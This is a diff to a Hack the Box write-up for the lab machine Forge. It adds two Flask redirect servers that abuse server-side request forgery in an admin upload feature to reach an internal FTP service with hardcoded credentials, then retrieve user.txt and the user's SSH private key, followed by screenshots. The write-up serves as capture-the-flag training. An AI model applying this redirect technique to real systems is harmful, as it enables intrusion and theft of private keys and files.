@@ -301,4 +301,76 @@ if __name__ == "__main__":
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/67a85a27-b900-4010-b61f-44229a1787ac)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/412d7505-26c2-4dd6-b543-5a32130d13ed)
 
+SSH:
+```python
+#!/usr/bin/env python
 
+from flask import Flask, redirect, request
+
+app = Flask(__name__)
+
+@app.route("/")
+def admin():
+    return redirect('http://admin.forge.htb/')
+
+@app.route("/announcements")
+def announcements():
+    return redirect('http://admin.forge.htb/announcements')
+
+@app.route("/ftp")
+def ftp():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1')
+
+@app.route('/userflag')
+def userflag():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/user.txt')
+
+@app.route("/ssh")
+def ssh():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/')
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=80)
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/57a20b26-e42f-43fd-afbd-6a1cafff35a5)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2c25be95-ff2d-415d-89af-8c9b7adcedb3)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d759f0d4-2ffd-4d47-8f62-842274e963c4)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c7039afe-2c42-4921-9c9e-80b5146fc9ab)
+
+```python
+#!/usr/bin/env python
+
+from flask import Flask, redirect, request
+
+app = Flask(__name__)
+
+@app.route("/")
+def admin():
+    return redirect('http://admin.forge.htb/')
+
+@app.route("/announcements")
+def announcements():
+    return redirect('http://admin.forge.htb/announcements')
+
+@app.route("/ftp")
+def ftp():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1')
+
+@app.route('/userflag')
+def userflag():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/user.txt')
+
+@app.route("/ssh")
+def ssh():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/')
+
+@app.route("/id_rsa")
+def id_rsa():
+    return redirect('http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa')
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=80)  
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3c86eb3b-5bdf-4f26-9f6a-2977e6bbeb09)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d5187750-d227-49f7-93d2-426f58625a68)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0b6867ac-cd1b-478e-a56a-9e0b6e2ce901)
